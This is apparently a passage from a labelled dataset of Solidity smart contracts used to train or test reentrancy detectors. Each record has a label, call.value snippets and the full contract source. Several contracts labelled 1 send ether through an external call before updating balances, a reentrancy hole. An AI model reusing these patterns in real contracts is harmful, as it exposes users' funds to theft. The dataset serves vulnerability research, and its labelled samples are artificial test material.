(plyr_[_pID].win).add(plyr_[_pID].gen).add(plyr_[_pID].aff); if (_earnings > 0) { plyr_[_pID].win = 0; plyr_[_pID].gen = 0; plyr_[_pID].aff = 0; } return(_earnings); } function endTx(uint256 _pID, uint256 _team, uint256 _eth, uint256 _keys, F3Ddatasets.EventReturns memory _eventData_) private { _eventData_.compressedData = _eventData_.compressedData + (now * 1000000000000000000) + (_team * 100000000000000000000000000000); _eventData_.compressedIDs = _eventData_.compressedIDs + _pID + (rID_ * 10000000000000000000000000000000000000000000000000000); emit F3Devents.onEndTx ( _eventData_.compressedData, _eventData_.compressedIDs, plyr_[_pID].name, msg.sender, _eth, _keys, _eventData_.winnerAddr, _eventData_.winnerName, _eventData_.amountWon, _eventData_.newPot, _eventData_.P3DAmount, _eventData_.genAmount, _eventData_.potAmount, airDropPot_ ); } function endTxQR(address _realSender,uint256 _pID, uint256 _team, uint256 _eth, uint256 _keys, F3Ddatasets.EventReturns memory _eventData_) private { _eventData_.compressedData = _eventData_.compressedData + (now * 1000000000000000000) + (_team * 100000000000000000000000000000); _eventData_.compressedIDs = _eventData_.compressedIDs + _pID + (rID_ * 10000000000000000000000000000000000000000000000000000); emit F3Devents.onEndTx ( _eventData_.compressedData, _eventData_.compressedIDs, plyr_[_pID].name, _realSender, _eth, _keys, _eventData_.winnerAddr, _eventData_.winnerName, _eventData_.amountWon, _eventData_.newPot, _eventData_.P3DAmount, _eventData_.genAmount, _eventData_.potAmount, airDropPot_ ); } function activate() public { require(msg.sender == admin, \"only admin can activate\"); require(activated_ == false, \"FOMO Short already activated\"); activated_ = true; rID_ = 1; round_[1].strt = now + rndExtra_ - rndGap_; round_[1].end = now + rndInit_ + rndExtra_; } } "}
{"sol name": "39662.sol", "label": 0, "first path": "function sendToCharger(uint id){ if (msg.sender != Owner && msg.sender != Manager) return ; var _amountForCharger = getAmountForCharger(id); uint _priceOfCharger = Chargers[id].Address.getPrice() ; if(_priceOfCharger> _amountForCharger){ uint difference  = _priceOfCharger - _amountForCharger; calculateCountOfInvestmetnsInQueue(difference,id); if(!Chargers[id].Address.call.value(_priceOfCharger)())   throw; ", "second path": "function sendToCharger(uint id){ if (msg.sender != Owner && msg.sender != Manager) return ; var _amountForCharger = getAmountForCharger(id); uint _priceOfCharger = Chargers[id].Address.getPrice() ; if(_priceOfCharger> _amountForCharger){ uint difference  = _priceOfCharger - _amountForCharger; calculateCountOfInvestmetnsInQueue(difference,id); if(!Chargers[id].Address.call.value(_priceOfCharger)())   throw; ", "third path": "function sendToCharger(uint id){ if (msg.sender != Owner && msg.sender != Manager) return ; var _amountForCharger = getAmountForCharger(id); uint _priceOfCharger = Chargers[id].Address.getPrice() ; if(_priceOfCharger> _amountForCharger){ uint difference  = _priceOfCharger - _amountForCharger; calculateCountOfInvestmetnsInQueue(difference,id); if(!Chargers[id].Address.call.value(_priceOfCharger)())   throw; ", "long path": "pragma solidity ^0.4.8; contract IElectricCharger { function setInvestors(uint[] ids,address[] addresses,uint[] balances,uint investmentsCount); function getPrice() constant external returns (uint price); } contract ElectricQueue  { address public Owner; uint public syncDate; uint public InvestmentsCount; uint public ChargersCount; Investment[] Investments; uint[]  ChargersIds ; mapping (uint=>Charger) Chargers; address public Proxy; address public Manager; struct Charger{ IElectricCharger Address; bool IsActive; } struct Investment { uint InvestmentId; address Address; uint ChargerId; uint Balance; uint TotalSum; bool IsTransfered; uint LastUpdateDate; bool IsReturned; } function ElectricQueue(address proxy){ Owner = msg.sender; syncDate = now; Proxy = proxy; } function setManager(address manager) external{ if (msg.sender != Owner) return ; Manager = manager; } function getChargers() external constant returns (uint [] chargers ,address[] addresses ,bool [] states) { uint length = ChargersIds.length; address []  memory _addresses = new address[](length); bool []  memory _states = new bool[](length); for(uint i = 0 ; i < ChargersIds.length;i++){ _addresses[i] = Chargers[ChargersIds[i]].Address; _states[i] = Chargers[ChargersIds[i]].IsActive; } return (ChargersIds,_addresses,_states); } function createInvestment(address _address,uint _chargerId) internal returns (Investment investor) { checkCharger(_chargerId); InvestmentsCount++; Investment memory _newInvestment; _newInvestment.Address = _address; _newInvestment.ChargerId = _chargerId; _newInvestment.InvestmentId = InvestmentsCount; Investments.push(_newInvestment); return _newInvestment; } function  investInQueue(address _from , uint _charger) payable returns(bool success) { var investmentId = getInvestment(_from,_charger); Investments[investmentId-1].Balance+=msg.value; Investments[investmentId-1].TotalSum+=msg.value; Investments[investmentId-1].IsTransfered=false; Investments[investmentId-1].IsReturned=false; Investments[investmentId-1].LastUpdateDate =now; syncDate = now; return true; } function checkCharger(uint _chargerId) internal{ if(!Chargers[_chargerId].IsActive ){ Chargers[_chargerId].IsActive = true; ChargersIds.push(_chargerId); ChargersCount++; } } function  getInvestment(address _address,uint _charger) internal returns (uint investmentId ) { for(uint i =0 ; i < InvestmentsCount ; i++){ if(Investments[i].Address ==_address && Investments[i].ChargerId == _charger){ return Investments[i].InvestmentId; } } var _investment = createInvestment(_address,_charger); return _investment.InvestmentId; } function getAllInvestments() external constant returns( uint [] ids , address[] addresses, uint[] chargerIds, uint [] balances , bool [] states , uint[] lastUpdateDates,uint[] totalSum) { uint length = InvestmentsCount; uint []  memory _ids  = new uint[](length); address []  memory _addresses = new address[](length); uint []  memory _chargerIds = new uint[](length); uint []  memory _balances= new uint[](length); bool []  memory _states = new bool[](length); uint []  memory _lastUpdateDates= new uint[](length); uint []  memory _totalSums= new uint[](length); for(uint i =0 ; i < InvestmentsCount ; i++){ _ids[i]= Investments[i].InvestmentId; _addresses[i]= Investments[i].Address; _chargerIds[i]=Investments[i].ChargerId; _balances[i]=Investments[i].Balance; _states[i]=Investments[i].IsTransfered; _totalSums[i]=Investments[i].TotalSum; _lastUpdateDates[i]=Investments[i].LastUpdateDate; } return(_ids,_addresses,_chargerIds,_balances,_states,_lastUpdateDates,_totalSums); } function setChargerAddress(uint id , address chargerAddress) { if (msg.sender != Owner && msg.sender != Manager) return ; Chargers[id].Address = IElectricCharger(chargerAddress); } function sendToCharger(uint id){ if (msg.sender != Owner && msg.sender != Manager) return ; var _amountForCharger = getAmountForCharger(id); uint _priceOfCharger = Chargers[id].Address.getPrice() ; if(_priceOfCharger> _amountForCharger){ uint difference  = _priceOfCharger - _amountForCharger; calculateCountOfInvestmetnsInQueue(difference,id); } if(!Chargers[id].Address.call.value(_priceOfCharger)())   throw; } function calculateCountOfInvestmetnsInQueue(uint difference ,uint id) internal{ uint queueInvestments=0; uint i =0;  uint investmantBalance=0; uint length = InvestmentsCount; uint []  memory _ids  = new uint[](length); address []  memory _addresses = new address[](length); uint []  memory _balances= new uint[](length); while(i <InvestmentsCount && difference > 0){ if(Investments[i].ChargerId == 0 && Investments[i].Balance >= 1 ether){ if(difference>Investments[i].Balance){ investmantBalance=Investments[i].Balance; Investments[i].Balance=0; Investments[i].IsTransfered =true; } else{ investmantBalance=difference ; Investments[i].Balance-=difference; } _ids[queueInvestments]=Investments[i].InvestmentId; _addresses[queueInvestments]=Investments[i].Address; _balances[queueInvestments]=investmantBalance; queueInvestments++; } i++; } Chargers[id].Address.setInvestors(_ids,_addresses,_balances,queueInvestments); } function getAmountForCharger(uint id) internal returns (uint sumBalance) { sumBalance = 0; uint chargerInvestments=0; uint length = InvestmentsCount; uint []  memory _ids  = new uint[](length); address []  memory _addresses = new address[](length); uint []  memory _balances= new uint[](length); for(uint i =0 ; i < InvestmentsCount ; i++){ if(Investments[i].ChargerId == id && Investments[i].Balance >= 1 ether){ _ids[chargerInvestments]=Investments[i].InvestmentId; _addresses[chargerInvestments]=Investments[i].Address; _balances[chargerInvestments]=Investments[i].Balance; sumBalance +=Investments[i].Balance; Investments[i].Balance=0; Investments[i].IsTransfered = true; chargerInvestments++; } } Chargers[id].Address.setInvestors(_ids,_addresses,_balances,chargerInvestments); } function  returnMoney(address _to) payable returns(bool success) { if(msg.sender != Proxy) return false; for(uint i =0 ; i < InvestmentsCount ; i++){ if(Investments[i].Address ==_to){ if(!_to.send(Investments[i].Balance)){ return false; } Investments[i].Balance = 0; Investments[i].IsReturned= true; } } return true; } } "}
{"sol name": "28974.sol", "label": 1, "first path": "function pay(address _addr, uint256 count) public payable { assert(changeable==true); assert(msg.value >= price*count); if(!founder.call.value(price*count)() || !msg.sender.call.value(msg.value-price*count)()){ revert(); s.update(_addr,count); Buy(msg.sender,count); function () public payable { pay(msg.sender,1); ", "second path": "function pay(address _addr, uint256 count) public payable { assert(changeable==true); assert(msg.value >= price*count); if(!founder.call.value(price*count)() || !msg.sender.call.value(msg.value-price*count)()){ revert(); s.update(_addr,count); Buy(msg.sender,count); function () public payable { pay(msg.sender,1); ", "third path": "function pay(address _addr, uint256 count) public payable { assert(changeable==true); assert(msg.value >= price*count); if(!founder.call.value(price*count)() || !msg.sender.call.value(msg.value-price*count)()){ revert(); s.update(_addr,count); Buy(msg.sender,count); function () public payable { pay(msg.sender,1); ", "long path": "pragma solidity ^0.4.19; contract Storage{ address public founder; bool public changeable; mapping( address => bool) public adminStatus; mapping( address => uint256) public slot; event Update(address whichAdmin, address whichUser, uint256 data); event Set(address whichAdmin, address whichUser, uint256 data); event Admin(address addr, bool yesno); modifier onlyFounder() { require(msg.sender==founder); _; } modifier onlyAdmin() { assert (adminStatus[msg.sender]==true); _; } function Storage() public { founder=msg.sender; adminStatus[founder]=true; changeable=true; } function update(address userAddress,uint256 data) public onlyAdmin(){ assert(changeable==true); assert(slot[userAddress]+data>slot[userAddress]); slot[userAddress]+=data; Update(msg.sender,userAddress,data); } function set(address userAddress, uint256 data) public onlyAdmin() { require(changeable==true || msg.sender==founder); slot[userAddress]=data; Set(msg.sender,userAddress,data); } function admin(address addr) public onlyFounder(){ adminStatus[addr] = !adminStatus[addr]; Admin(addr, adminStatus[addr]); } function halt() public onlyFounder(){ changeable=!changeable; } function() public{ revert(); } } pragma solidity ^0.4.19; contract Payee{ uint256 public price; address public storageAddress; address public founder; bool public changeable; mapping( address => bool) public adminStatus; Storage s; event Buy(address addr, uint256 count); event SetPrice(address addr, uint256 price); event Admin(address addr, bool yesno); modifier onlyAdmin() { assert (adminStatus[msg.sender]==true); _; } modifier onlyFounder() { require(msg.sender==founder); _; } function admin(address addr) public onlyFounder(){ adminStatus[addr] = !adminStatus[addr]; Admin(addr, adminStatus[addr]); } function Payee(address addr) public { founder=msg.sender; price=3000000000000000; adminStatus[founder]=true; storageAddress=addr; s=Storage(storageAddress); changeable=true; } function setPrice(uint256 _price) public onlyAdmin(){ price=_price; SetPrice(msg.sender, price); } function setStorageAddress(address _addr) public onlyAdmin(){ storageAddress=_addr; s=Storage(storageAddress); } function halt() public onlyFounder(){ changeable=!changeable; } function pay(address _addr, uint256 count) public payable { assert(changeable==true); assert(msg.value >= price*count); if(!founder.call.value(price*count)() || !msg.sender.call.value(msg.value-price*count)()){ revert(); } s.update(_addr,count); Buy(msg.sender,count); } function () public payable { pay(msg.sender,1); } } "}
{"sol name": "27188.sol", "label": 1, "first path": "function loggedTransfer(uint amount, bytes32 message, address target, address currentOwner) protected { if(!target.call.value(amount)()) throw; Transfer(amount, message, target, currentOwner); function divest(uint amount) public { if ( investors[msg.sender].investment == 0 || amount == 0) throw; investors[msg.sender].investment -= amount; sumInvested -= amount; this.loggedTransfer(amount, \"\", msg.sender, owner); function payDividend() public { uint dividend = calculateDividend(); if (dividend == 0) throw; investors[msg.sender].lastDividend = sumDividend; this.loggedTransfer(dividend, \"Dividend payment\", msg.sender, owner); function doTransfer(address target, uint amount) public onlyOwner { this.loggedTransfer(amount, \"Owner transfer\", target, owner); ", "second path": "function loggedTransfer(uint amount, bytes32 message, address target, address currentOwner) protected { if(!target.call.value(amount)()) throw; Transfer(amount, message, target, currentOwner); function divest(uint amount) public { if ( investors[msg.sender].investment == 0 || amount == 0) throw; investors[msg.sender].investment -= amount; sumInvested -= amount; this.loggedTransfer(amount, \"\", msg.sender, owner); function payDividend() public { uint dividend = calculateDividend(); if (dividend == 0) throw; investors[msg.sender].lastDividend = sumDividend; this.loggedTransfer(dividend, \"Dividend payment\", msg.sender, owner); function doTransfer(address target, uint amount) public onlyOwner { this.loggedTransfer(amount, \"Owner transfer\", target, owner); ", "third path": "function loggedTransfer(uint amount, bytes32 message, address target, address currentOwner) protected { if(!target.call.value(amount)()) throw; Transfer(amount, message, target, currentOwner); function divest(uint amount) public { if ( investors[msg.sender].investment == 0 || amount == 0) throw; investors[msg.sender].investment -= amount; sumInvested -= amount; this.loggedTransfer(amount, \"\", msg.sender, owner); function payDividend() public { uint dividend = calculateDividend(); if (dividend == 0) throw; investors[msg.sender].lastDividend = sumDividend; this.loggedTransfer(dividend, \"Dividend payment\", msg.sender, owner); function doTransfer(address target, uint amount) public onlyOwner { this.loggedTransfer(amount, \"Owner transfer\", target, owner); ", "long path": "pragma solidity ^0.4.0; contract Ownable { address public owner; function Ownable() public { owner = msg.sender; } modifier onlyOwner() { if (msg.sender != owner) throw; _; } modifier protected() { if(msg.sender != address(this)) throw; _; } function transferOwnership(address newOwner) public onlyOwner { if (newOwner == address(0)) throw; owner = newOwner; } } contract DividendDistributor is Ownable{ event Transfer( uint amount, bytes32 message, address target, address currentOwner ); struct Investor { uint investment; uint lastDividend; } mapping(address => Investor) investors; uint public minInvestment; uint public sumInvested; uint public sumDividend; function PrivateInvestment() public{ minInvestment = 0.4 ether; } function loggedTransfer(uint amount, bytes32 message, address target, address currentOwner) protected { if(!target.call.value(amount)()) throw; Transfer(amount, message, target, currentOwner); } function invest() public payable { if (msg.value >= minInvestment) { investors[msg.sender].investment += msg.value; sumInvested += msg.value; investors[msg.sender].lastDividend = sumDividend; } } function divest(uint amount) public { if ( investors[msg.sender].investment == 0 || amount == 0) throw; investors[msg.sender].investment -= amount; sumInvested -= amount; this.loggedTransfer(amount, \"\", msg.sender, owner); } function calculateDividend() constant public returns(uint dividend) { uint lastDividend = investors[msg.sender].lastDividend; if (sumDividend > lastDividend) throw; dividend = (sumDividend - lastDividend) * investors[msg.sender].investment / sumInvested; } function getInvestment() constant public returns(uint investment) { investment = investors[msg.sender].investment; } function payDividend() public { uint dividend = calculateDividend(); if (dividend == 0) throw; investors[msg.sender].lastDividend = sumDividend; this.loggedTransfer(dividend, \"Dividend payment\", msg.sender, owner); } function distributeDividends() public payable onlyOwner { sumDividend += msg.value; } function doTransfer(address target, uint amount) public onlyOwner { this.loggedTransfer(amount, \"Owner transfer\", target, owner); } function setMinInvestment(uint amount) public onlyOwner { minInvestment = amount; } function () public payable onlyOwner { } function destroy() public onlyOwner { selfdestruct(msg.sender); } } "}
{"sol name": "10297.sol", "label": 0, "first path": "function execute0(address to, uint256 value, bytes data) private returns (address created)  { if (to == 0) { created = create0(value, data); } else { require(to.call.value(value)(data)); ", "second path": "function execute0(address to, uint256 value, bytes data) private returns (address created)  { if (to == 0) { created = create0(value, data); } else { require(to.call.value(value)(data)); ", "third path": "function execute0(address to, uint256 value, bytes data) private returns (address created)  { if (to == 0) { created = create0(value, data); } else { require(to.call.value(value)(data)); ", "long path": "pragma solidity ^0.4.24; pragma experimental \"v0.5.0\"; pragma experimental ABIEncoderV2; library Math { struct Fraction { uint256 numerator; uint256 denominator; } function isPositive(Fraction memory fraction) internal pure returns (bool) { return fraction.numerator > 0 && fraction.denominator > 0; } function mul(uint256 a, uint256 b) internal pure returns (uint256 r) { r = a * b; require((a == 0) || (r / a == b)); } function div(uint256 a, uint256 b) internal pure returns (uint256 r) { r = a / b; } function sub(uint256 a, uint256 b) internal pure returns (uint256 r) { require((r = a - b) <= a); } function add(uint256 a, uint256 b) internal pure returns (uint256 r) { require((r = a + b) >= a); } function min(uint256 x, uint256 y) internal pure returns (uint256 r) { return x <= y ? x : y; } function max(uint256 x, uint256 y) internal pure returns (uint256 r) { return x >= y ? x : y; } function mulDiv(uint256 value, uint256 m, uint256 d) internal pure returns (uint256 r) { r = value * m; if (r / value == m) { r /= d; } else { r = mul(value / d, m); } } function mulDivCeil(uint256 value, uint256 m, uint256 d) internal pure returns (uint256 r) { r = value * m; if (r / value == m) { if (r % d == 0) { r /= d; } else { r = (r / d) + 1; } } else { r = mul(value / d, m); if (value % d != 0) { r += 1; } } } function mul(uint256 x, Fraction memory f) internal pure returns (uint256) { return mulDiv(x, f.numerator, f.denominator); } function mulCeil(uint256 x, Fraction memory f) internal pure returns (uint256) { return mulDivCeil(x, f.numerator, f.denominator); } function div(uint256 x, Fraction memory f) internal pure returns (uint256) { return mulDiv(x, f.denominator, f.numerator); } function divCeil(uint256 x, Fraction memory f) internal pure returns (uint256) { return mulDivCeil(x, f.denominator, f.numerator); } function mul(Fraction memory x, Fraction memory y) internal pure returns (Math.Fraction) { return Math.Fraction({ numerator: mul(x.numerator, y.numerator), denominator: mul(x.denominator, y.denominator) }); } } contract FsTKColdWallet { using Math for uint256; event ConfirmationNeeded(address indexed initiator, bytes32 indexed operation, address indexed to, uint256 value, bytes data); event Confirmation(address indexed authority, bytes32 indexed operation); event Revoke(address indexed authority, bytes32 indexed operation); event AuthorityChanged(address indexed oldAuthority, address indexed newAuthority); event AuthorityAdded(address authority); event AuthorityRemoved(address authority); event RequirementChanged(uint256 required); event DayLimitChanged(uint256 dayLimit); event SpentTodayReset(uint256 spentToday); event Deposit(address indexed from, uint256 value); event SingleTransaction(address indexed authority, address indexed to, uint256 value, bytes data, address created); event MultiTransaction(address indexed authority, bytes32 indexed operation, address indexed to, uint256 value, bytes data, address created); struct TransactionInfo { address to; uint256 value; bytes data; } struct PendingTransactionState { TransactionInfo info; uint256 confirmNeeded; uint256 confirmBitmap; uint256 index; } modifier onlyAuthority { require(isAuthority(msg.sender)); _; } modifier confirmAndRun(bytes32 operation) { if (confirmAndCheck(operation)) { _; } } uint256 constant MAX_AUTHORITIES = 250; uint256 public requiredAuthorities; uint256 public numAuthorities; uint256 public dailyLimit; uint256 public spentToday; uint256 public lastDay; address[256] public authorities; mapping(address => uint256) public authorityIndex; mapping(bytes32 => PendingTransactionState) public pendingTransaction; bytes32[] public pendingOperation; constructor(address[] _authorities, uint256 required, uint256 _daylimit) public { require( required > 0 && authorities.length >= required ); numAuthorities = _authorities.length; for (uint256 i = 0; i < _authorities.length; i += 1) { authorities[1 + i] = _authorities[i]; authorityIndex[_authorities[i]] = 1 + i; } requiredAuthorities = required; dailyLimit = _daylimit; lastDay = today(); } function() external payable { if (msg.value > 0) { emit Deposit(msg.sender, msg.value); } } function getAuthority(uint256 index) public view returns (address) { return authorities[index + 1]; } function getAuthorityIndex(address authority) public view returns (uint256 index) { index = authorityIndex[authority]; require(index > 0); } function isAuthority(address authority) public view returns (bool) { return authorityIndex[authority] > 0; } function hasConfirmed(bytes32 operation, address _address) public view returns (bool) { return (pendingTransaction[operation].confirmBitmap & (1 << getAuthorityIndex(_address))) != 0; } function changeAuthority(address from, address to) public confirmAndRun(keccak256(msg.data)) { require(!isAuthority(to)); uint256 index = getAuthorityIndex(from); authorities[index] = to; authorityIndex[to] = index; delete authorityIndex[from]; clearPending(); emit AuthorityChanged(from, to); } function addAuthority(address authority) public confirmAndRun(keccak256(msg.data)) { require(!isAuthority(authority)); if (numAuthorities >= MAX_AUTHORITIES) { reOrganizeAuthorities(); } require(numAuthorities < MAX_AUTHORITIES); numAuthorities += 1; authorities[numAuthorities] = authority; authorityIndex[authority] = numAuthorities; clearPending(); emit AuthorityAdded(authority); } function removeAuthority(address authority) public confirmAndRun(keccak256(msg.data)) { require(numAuthorities > requiredAuthorities); uint256 index = getAuthorityIndex(authority); delete authorities[index]; delete authorityIndex[authority]; clearPending(); reOrganizeAuthorities(); emit AuthorityRemoved(authority); } function setRequirement(uint256 required) public confirmAndRun(keccak256(msg.data)) { require(numAuthorities >= requiredAuthorities); clearPending(); emit RequirementChanged(requiredAuthorities = required); } function setDailyLimit(uint256 _dailyLimit) public confirmAndRun(keccak256(msg.data)) { clearPending(); emit DayLimitChanged(dailyLimit = _dailyLimit); } function resetSpentToday() public confirmAndRun(keccak256(msg.data)) { clearPending(); emit SpentTodayReset(spentToday); delete spentToday; } function propose(address to, uint256 value, bytes data) public onlyAuthority returns (bytes32 operation) { if ((data.length == 0 && checkAndUpdateLimit(value)) || requiredAuthorities == 1) { emit SingleTransaction(msg.sender, to, value, data, execute0(to, value, data)); } else { operation = keccak256(abi.encodePacked(msg.data, pendingOperation.length)); PendingTransactionState storage status = pendingTransaction[operation]; if (status.info.to == 0 && status.info.value == 0 && status.info.data.length == 0) { status.info = TransactionInfo({to: to, value: value, data: data}); } if (!confirm(operation)) { emit ConfirmationNeeded(msg.sender, operation, to, value, data); } } } function revoke(bytes32 operation) public { uint256 confirmFlag = 1 << getAuthorityIndex(msg.sender); PendingTransactionState storage state = pendingTransaction[operation]; if (state.confirmBitmap & confirmFlag > 0) { state.confirmNeeded += 1; state.confirmBitmap &= ~confirmFlag; emit Revoke(msg.sender, operation); } } function confirm(bytes32 operation) public confirmAndRun(operation) returns (bool) { PendingTransactionState storage status = pendingTransaction[operation]; if (status.info.to != 0 || status.info.value != 0 || status.info.data.length != 0) { emit MultiTransaction(msg.sender, operation, status.info.to, status.info.value, status.info.data, execute0(status.info.to, status.info.value, status.info.data)); delete pendingTransaction[operation].info; return true; } } function execute0(address to, uint256 value, bytes data) private returns (address created)  { if (to == 0) { created = create0(value, data); } else { require(to.call.value(value)(data)); } } function create0(uint256 value, bytes code) internal returns (address _address) { assembly { _address := create(value, add(code, 0x20), mload(code)) if iszero(extcodesize(_address)) { revert(0, 0) } } } function confirmAndCheck(bytes32 operation) private returns (bool) { PendingTransactionState storage pending = pendingTransaction[operation]; if (pending.confirmNeeded == 0) { pending.confirmNeeded = requiredAuthorities; delete pending.confirmBitmap; pending.index = pendingOperation.length; pendingOperation.push(operation); } uint256 confirmFlag = 1 << getAuthorityIndex(msg.sender); if (pending.confirmBitmap & confirmFlag == 0) { emit Confirmation(msg.sender, operation); if (pending.confirmNeeded <= 1) { delete pendingOperation[pending.index]; delete pending.confirmNeeded; delete pending.confirmBitmap; delete pending.index; return true; } else { pending.confirmNeeded -= 1; pending.confirmBitmap |= confirmFlag; } } } function checkAndUpdateLimit(uint256 value) private returns (bool) { if (today() > lastDay) { spentToday = 0; lastDay = today(); } uint256 _spentToday = spentToday.add(value); if (_spentToday <= dailyLimit) { spentToday = _spentToday; return true; } return false; } function today() private view returns (uint256) { return block.timestamp / 1 days; } function reOrganizeAuthorities() private { uint256 free = 1; while (free < numAuthorities) { while (free < numAuthorities && authorities[free] != 0) { free += 1; } while (numAuthorities > 1 && authorities[numAuthorities] == 0) { numAuthorities -= 1; } if (free < numAuthorities && authorities[numAuthorities] != 0 && authorities[free] == 0) { authorities[free] = authorities[numAuthorities]; authorityIndex[authorities[free]] = free; delete authorities[numAuthorities]; } } } function clearPending() private { for (uint256 i = 0; i < pendingOperation.length; i += 1) { delete pendingTransaction[pendingOperation[i]]; } delete pendingOperation; } } "}
{"sol name": "14620.sol", "label": 0, "first path": "function transferEth(address walletToTransfer, uint256 weiAmount) onlyOwner payable public { require(walletToTransfer != address(0)); require(address(this).balance >= weiAmount); require(address(this) != walletToTransfer); require(walletToTransfer.call.value(weiAmount)()); ", "second path": "function transferEth(address walletToTransfer, uint256 weiAmount) onlyOwner payable public { require(walletToTransfer != address(0)); require(address(this).balance >= weiAmount); require(address(this) != walletToTransfer); require(walletToTransfer.call.value(weiAmount)()); ", "third path": "function transferEth(address walletToTransfer, uint256 weiAmount) onlyOwner payable public { require(walletToTransfer != address(0)); require(address(this).balance >= weiAmount); require(address(this) != walletToTransfer); require(walletToTransfer.call.value(weiAmount)()); ", "long path": "pragma solidity ^0.4.19; library SafeMath { function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == 0) { return 0; } uint256 c = a * b; assert(c / a == b); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a / b; return c; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { assert(b <= a); return a - b; } function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; assert(c >= a); return c; } } contract Ownable { address public owner; event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); function Ownable() public { owner = msg.sender; } modifier onlyOwner() { require(msg.sender == owner); _; } function transferOwnership(address newOwner) public onlyOwner { require(newOwner != address(0)); OwnershipTransferred(owner, newOwner); owner = newOwner; } } contract ERC20Basic { uint256 public totalSupply; function balanceOf(address who) public view returns (uint256); function transfer(address to, uint256 value) public returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); } contract BasicToken is ERC20Basic { using SafeMath for uint256; mapping(address => uint256) balances; function transfer(address _to, uint256 _value) public returns (bool) { require(_to != address(0)); require(_value <= balances[msg.sender]); balances[msg.sender] = balances[msg.sender].sub(_value); balances[_to] = balances[_to].add(_value); Transfer(msg.sender, _to, _value); return true; } function balanceOf(address _owner) public view returns (uint256 balance) { return balances[_owner]; } } contract ERC20 is ERC20Basic { function allowance(address owner, address spender) public view returns (uint256); function transferFrom(address from, address to, uint256 value) public returns (bool); function approve(address spender, uint256 value) public returns (bool); event Approval(address indexed owner, address indexed spender, uint256 value); } contract StandardToken is ERC20, BasicToken { mapping (address => mapping (address => uint256)) internal allowed; function transferFrom(address _from, address _to, uint256 _value) public returns (bool) { require(_to != address(0)); require(_value <= balances[_from]); require(_value <= allowed[_from][msg.sender]); balances[_from] = balances[_from].sub(_value); balances[_to] = balances[_to].add(_value); allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value); Transfer(_from, _to, _value); return true; } function approve(address _spender, uint256 _value) public returns (bool) { allowed[msg.sender][_spender] = _value; Approval(msg.sender, _spender, _value); return true; } function allowance(address _owner, address _spender) public view returns (uint256) { return allowed[_owner][_spender]; } function increaseApproval(address _spender, uint _addedValue) public returns (bool) { allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue); Approval(msg.sender, _spender, allowed[msg.sender][_spender]); return true; } function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) { uint oldValue = allowed[msg.sender][_spender]; if (_subtractedValue > oldValue) { allowed[msg.sender][_spender] = 0; } else { allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue); } Approval(msg.sender, _spender, allowed[msg.sender][_spender]); return true; } } contract MintableToken is StandardToken, Ownable { event Mint(address indexed to, uint256 amount); event MintFinished(); bool public mintingFinished = false; modifier canMint() { require(!mintingFinished); _; } function mint(address _to, uint256 _amount) onlyOwner canMint public returns (bool) { totalSupply = totalSupply.add(_amount); balances[_to] = balances[_to].add(_amount); Mint(_to, _amount); Transfer(address(0), _to, _amount); return true; } function finishMinting() onlyOwner canMint public returns (bool) { mintingFinished = true; MintFinished(); return true; } } contract TokensGate is MintableToken { event Burn(address indexed burner, uint256 value); string public constant name = \"TokensGate\"; string public constant symbol = \"TGC\"; uint8 public constant decimals = 18; bool public AllowTransferGlobal = false; bool public AllowTransferLocal = false; bool public AllowTransferExternal = false; mapping(address => uint256) public Whitelist; mapping(address => uint256) public LockupList; mapping(address => bool) public WildcardList; mapping(address => bool) public Managers; function allowTransfer(address _from, address _to) public view returns (bool) { if (WildcardList[_from]) return true; if (LockupList[_from] > now) return false; if (!AllowTransferGlobal) { if (AllowTransferLocal && Whitelist[_from] != 0 && Whitelist[_to] != 0 && Whitelist[_from] < now && Whitelist[_to] < now) return true; if (AllowTransferExternal && Whitelist[_from] != 0 && Whitelist[_from] < now) return true; return false; } return true; } function allowManager() public view returns (bool) { if (msg.sender == owner) return true; if (Managers[msg.sender]) return true; return false; } function transfer(address _to, uint256 _value) public returns (bool) { require(allowTransfer(msg.sender, _to)); return super.transfer(_to, _value); } function transferFrom(address _from, address _to, uint256 _value) public returns (bool) { require(allowTransfer(_from, _to)); return super.transferFrom(_from, _to, _value); } function mint(address _to, uint256 _amount) onlyOwner canMint public returns (bool) { require(totalSupply.add(_amount) < 1000000000000000000000000000); return super.mint(_to, _amount); } function burn(address _burner, uint256 _value) onlyOwner public { require(_value <= balances[_burner]); balances[_burner] = balances[_burner].sub(_value); totalSupply = totalSupply.sub(_value); Burn(_burner, _value); Transfer(_burner, address(0), _value); } function setManager(address _manager, bool _status) onlyOwner public { Managers[_manager] = _status; } function setAllowTransferGlobal(bool _status) public { require(allowManager()); AllowTransferGlobal = _status; } function setAllowTransferLocal(bool _status) public { require(allowManager()); AllowTransferLocal = _status; } function setAllowTransferExternal(bool _status) public { require(allowManager()); AllowTransferExternal = _status; } function setWhitelist(address _address, uint256 _date) public { require(allowManager()); Whitelist[_address] = _date; } function setLockupList(address _address, uint256 _date) public { require(allowManager()); LockupList[_address] = _date; } function setWildcardList(address _address, bool _status) public { require(allowManager()); WildcardList[_address] = _status; } function transferTokens(address walletToTransfer, address tokenAddress, uint256 tokenAmount) onlyOwner payable public { ERC20 erc20 = ERC20(tokenAddress); erc20.transfer(walletToTransfer, tokenAmount); } function transferEth(address walletToTransfer, uint256 weiAmount) onlyOwner payable public { require(walletToTransfer != address(0)); require(address(this).balance >= weiAmount); require(address(this) != walletToTransfer); require(walletToTransfer.call.value(weiAmount)()); } } "}
